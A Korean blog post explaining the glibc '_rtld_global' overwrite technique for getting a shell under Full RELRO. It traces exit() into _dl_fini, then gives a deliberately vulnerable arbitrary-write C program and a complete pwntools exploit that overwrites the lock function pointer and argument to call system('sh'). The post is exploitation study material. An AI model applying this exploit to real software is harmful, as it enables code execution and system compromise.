---
tistoryBlogName: k0n9
tistoryTitle: rtld global
tistoryVisibility: "3"
tistoryCategory: "1136867"
tistorySkipModal: true
tistoryPostId: "41"
tistoryPostUrl: https://k0n9.tistory.com/41
---
이는 exit함수로 종료될 경우에 Full RELRO 보호기법이 적용되어있을 때 사용 가능한 공격이다.

Full RELRO 보호기법이 적용되어 있기 때문에 .fini_array overwrite는 사용할 수 없다.
우선 main이 종료되는 과정을 보자.

#### main이 종료되는 과정
main 함수가 리턴된 후, exit 함수를 호출한다.
![](https://i.imgur.com/TtQEl77.png)
여기서 인자값이 0인것을 알 수 있는데 이는 흔히 c언어에서 main의 마지막에 return 0 ; 를 하는데 이 0이 exit함수의 파라미터로 들어가 것이다.

![](https://i.imgur.com/5yTT34B.png)
exit함수 내부에서는 \_\_run_exit_handlers를 호출한다.

![](https://i.imgur.com/ShhrShj.png)

계속 따라가다 보면 \_dl_fini를 호출한다.

\_\_run_exit_handlers 함수는 exit_function 구조체 멤버 변수인 flavor 값에 따라서 함수를 호출하게 되는데, 기본 상태에서는 로더 라이브러리 내부에 존재하는 \_dl_fini 함수를 호출한다고 한다.

![](https://i.imgur.com/JkursFc.png)
\_dl_fini 중간에 .fini_array를 참조하고 호출한다.

함수 호출 후 \_dl_fini()로 돌아온 후 \_dl_fini()가 리턴되고 다시 \_run_exit_handlers()루틴으로 돌아오면 \__GI_exit()를 호출한다.

![](https://i.imgur.com/BISf4Jk.png)
![](https://i.imgur.com/Mudh32M.png)
결과적으로 syscall을 하면서 프로세스가 완전히 종료된다.


위 과정에서 볼 수 있듯이 \_GI_exit 함수는 \_run_exit_handlers 함수를 호출한다. \_run_exit_handlers는 ld.so 에 존재하는 \_dl_fini 함수를 호출하게 된다.

다음은 \_dl_fini 함수 코드의 일부이다.
```c
void
_dl_fini (void)
{
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));
      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
      /* No need to do anything for empty namespaces or those used for
	 auditing DSOs.  */
      if (nloaded == 0
	__rtld_lock_unlock_recursive (GL(dl_load_lock));
```

\_dl_fini 함수는 \_dl_load_lock을 인자로 \__rtld_lock_lock_recursive 함수를 호출한다. 해당 함수와 인자는 _rtld_global 구조체의 멤버이다.

\_rtld_global 구조체가 위치한 영역에는 쓰기 권한이 있기 때문에 \_rtld_lock_lock_recursive 함수 포인터와 \_dl_load_lock의 값을 덮어쓸 수 있다면 system(”sh”)를 호출할 수 있다.

\_rtld_global 구조체를 확인해보자
![](https://i.imgur.com/ld3juT2.png)

\_dl_rtld_lock_recursive 함수포인터를 확인할 수 있다.
![](https://i.imgur.com/jWAU3Bo.png)

### 예제
```C
// gcc -o dlfini dlfini.c -no-pie -z relro -z now
#include <stdio.h>
#include <stdlib.h>
int main()
{
    long long addr;
    long long data;
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    printf("stdout: %lp\n",stdout);
    printf("addr: ");
    scanf("%ld",&addr);
    printf("data: ");
    scanf("%ld",&data);
    *(long long *)addr = data;
    exit(0);
}
```
해당 예제는 임의 주소 쓰기 취약점이 있다. 그런데 한 번의 실행만으로 \_rtld_lock_lock_recursive 함수 포인터와 \_dl_load_lock 인자를 동시에 조작할 수 없다. 그래서 우선 \_rtld_lock_lock_recursive 함수 포인터의 값을 start 함수의 주소로 바꿔 exit 함수가 호출될 때 프로그램의 시작 주소로 다시 돌아가게 만든다. 그리고 그러면 임의 주소 쓰기를 계속 할 수 있다.

\_dl_load_lock 에 sh 문자열을, \_rtld_lock_lock_recursive 함수 포인터에는 system 함수의 주소를 덮어써 system("sh")를 호출한다.

참고로 \_dl_load_lock에 sh 문자열 자체를 입력하는거다.(주소 아님) system은 \_dl_load_lock을 참조해서 문자열을 가져오는거니 sh문자열을 넣어야한다.

```python
from pwn import *
  
p = process("./dlfini")
  
start = 0x400580
std_off = 0x3ec760
system_off = 0x4f420
recur_off = 0x61bf60
lock_off = 0x61b968
binsh_off = 0x1b3d88
  
p.recvuntil("stdout: 0x")
stdout = int(p.recv(12), 16)
libc_base = stdout-std_off
system = libc_base + system_off
recur = libc_base + recur_off
lock = libc_base + lock_off
binsh = libc_base + binsh_off
  
p.sendlineafter(b"addr: ", str(recur))
p.sendlineafter(b"data: ", str(start))
  
p.sendlineafter(b"addr: ", str(lock))
p.sendlineafter(b"data: ", str(0x6873))
  
p.sendlineafter(b"addr: ", str(recur))
p.sendlineafter(b"data: ", str(system))
  
p.interactive()
```
![](https://i.imgur.com/9775mfi.png)
